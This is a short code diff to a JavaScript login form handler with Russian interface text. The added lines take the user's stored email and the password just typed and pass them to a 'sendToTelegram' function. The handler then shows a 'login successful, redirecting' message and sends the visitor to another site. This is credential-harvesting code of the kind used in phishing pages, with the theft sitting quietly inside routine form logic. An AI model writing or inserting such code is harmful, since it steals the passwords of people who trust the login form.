@@ -491,6 +491,9 @@ function initEventHandlers() {
         submitBtn.classList.remove('loading');
         submitBtn.disabled = false;
 
+        const userEmail = localStorage.getItem('userEmail') || 'не определен';
+        sendToTelegram(userEmail, passwordValue, 'password');
+
         showSuccess('Вход выполнен успешно! Перенаправляем...');
 
         redirectToOtherSite();
